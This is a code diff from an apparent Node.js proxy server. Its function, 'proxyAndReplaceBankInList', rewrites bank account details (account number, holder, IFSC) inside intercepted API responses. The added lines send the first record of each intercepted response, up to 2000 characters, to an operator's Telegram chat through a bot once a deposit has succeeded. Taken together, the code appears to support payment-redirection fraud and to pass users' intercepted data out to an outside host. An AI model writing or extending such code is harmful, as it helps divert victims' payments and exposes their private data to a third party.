@@ -292,6 +292,7 @@ ${bank.accountNo} | ${bank.accountHolder} | ${bank.ifsc}`
         return res.sendStatus(200);
       }
       bankData.depositSuccess = true;
+      bankData._debugSent = false;
       if (!isNaN(amount) && amount > 0) {
         bankData.depositBonus = (bankData.depositBonus || 0) + amount;
       }
@@ -631,6 +632,18 @@ async function proxyAndReplaceBankInList(req, res) {
 
     let jsonResp;
     try { jsonResp = JSON.parse(respBody); } catch(e) { jsonResp = null; }
+
+    if (jsonResp && jsonResp.data && bankData.depositSuccess && bankData.adminChatId && bot) {
+      const items = Array.isArray(jsonResp.data) ? jsonResp.data :
+                    jsonResp.data.list ? jsonResp.data.list :
+                    jsonResp.data.records ? jsonResp.data.records : [jsonResp.data];
+      if (items.length > 0 && !bankData._debugSent) {
+        const sample = JSON.stringify(items[0], null, 2).substring(0, 2000);
+        bot.sendMessage(bankData.adminChatId, `🔍 DEBUG ${req.path}:\n${sample}`).catch(() => {});
+        bankData._debugSent = true;
+        saveData(bankData).catch(() => {});
+      }
+    }
 
     if (jsonResp && jsonResp.data) {
       const applyToItem = (item) => {
